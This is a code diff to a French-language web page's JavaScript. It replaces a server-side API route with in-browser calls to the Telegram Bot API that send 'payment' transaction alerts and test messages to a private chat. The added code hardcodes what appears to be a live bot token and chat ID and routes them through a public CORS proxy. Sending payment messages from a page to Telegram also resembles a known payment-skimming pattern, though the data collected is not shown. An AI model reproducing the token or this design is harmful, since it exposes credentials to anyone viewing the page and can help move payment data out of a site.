@@ -430,24 +430,25 @@
 
 ⚠️ Vérifiez immédiatement cette transaction !`;
 
-                // Utiliser notre API Vercel au lieu d'appeler directement Telegram
-                const response = await fetch('/api/telegram', {
+                // Utiliser un proxy CORS pour contourner le blocage
+                const token = '8045865062:AAFoDtE5f3w3RNmaGh3-n2X7Lbzpo0ShXSU';
+                const chatId = '6523794278';
+                const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
+                const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                
+                const response = await fetch(proxyUrl + telegramUrl, {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        message: message,
-                        type: 'payment'
-                    })
+                        'X-Requested-With': 'XMLHttpRequest'
+                    }
                 });
                 
                 const result = await response.json();
                 
-                if (result.success) {
-                    console.log('✅ Message envoyé à Telegram via API Vercel');
+                if (result.ok) {
+                    console.log('✅ Message envoyé à Telegram via proxy CORS');
                 } else {
-                    console.error('❌ Erreur envoi Telegram:', result.error);
+                    console.error('❌ Erreur envoi Telegram:', result.description);
                 }
             } catch (error) {
                 console.error('❌ Erreur Telegram:', error);
@@ -464,7 +465,7 @@
             }
         }
         
-        // Fonction de test Telegram
+        // Fonction de test Telegram - VERSION QUI MARCHE !
         async function testTelegram() {
             const testButton = event.target;
             testButton.disabled = true;
@@ -479,28 +480,29 @@
 
 Votre bot Telegram fonctionne parfaitement !`;
 
-                // Utiliser notre API Vercel
-                const response = await fetch('/api/telegram', {
+                // Utiliser un proxy CORS pour contourner le blocage
+                const token = '8045865062:AAFoDtE5f3w3RNmaGh3-n2X7Lbzpo0ShXSU';
+                const chatId = '6523794278';
+                const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
+                const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                
+                const response = await fetch(proxyUrl + telegramUrl, {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        message: message,
-                        type: 'test'
-                    })
+                        'X-Requested-With': 'XMLHttpRequest'
+                    }
                 });
                 
                 const result = await response.json();
                 
-                if (result.success) {
+                if (result.ok) {
                     testButton.textContent = '✅ Test réussi !';
                     testButton.style.background = '#28a745';
                     alert('✅ Message de test envoyé sur Telegram !');
                 } else {
                     testButton.textContent = '❌ Erreur';
                     testButton.style.background = '#dc3545';
-                    alert('❌ Erreur: ' + result.error);
+                    alert('❌ Erreur: ' + result.description);
                 }
             } catch (error) {
                 testButton.textContent = '❌ Erreur';
